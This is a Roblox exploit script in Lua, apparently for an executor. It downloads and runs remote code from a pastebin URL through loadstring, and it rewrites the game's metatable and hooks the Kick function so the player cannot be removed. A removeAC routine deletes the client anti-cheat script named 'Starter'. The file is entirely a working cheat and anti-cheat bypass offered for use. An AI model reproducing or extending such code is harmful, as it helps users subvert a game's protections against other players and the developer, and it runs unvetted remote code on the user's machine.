-- // Valiant ENV
loadstring(game.HttpGet(game, "https://pastebin.com/raw/MWss4FBj", true))()

-- // Vars
local RenderStepped = RunService.RenderStepped
local Heartbeat = RunService.Heartbeat
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded.Wait(LocalPlayer.CharacterAdded)
local Humanoid = Character.WaitForChild(Character, "Humanoid")
local CurrentCamera = Workspace.CurrentCamera
local Mouse = LocalPlayer.GetMouse(LocalPlayer)

-- // Base MT Vars + Funs
local mt = getrawmetatable(game)
local backupnamecall = mt.__namecall
local backupnewindex = mt.__newindex
local backupindex = mt.__index 
setreadonly(mt, false)

-- // Anti Kick
hookfunction(LocalPlayer.Kick, warn)
hookfunction(LocalPlayer.kick, warn)
mt.__namecall = newcclosure(function(...)
    local method = getnamecallmethod()
    if string.lower(method) == "kick" then
        return
    end
    return backupnamecall(...)
end)

-- // AC Bypass
function removeAC()
    local Player = Players.LocalPlayer
    if Player.PlayerScripts:FindFirstChild("Starter") then Player.PlayerScripts.Starter:Destroy() end
    if StarterPlayer.StarterPlayerScripts:FindFirstChild("Starter") then StarterPlayer.StarterPlayerScripts.Starter:Destroy() end
end

removeAC()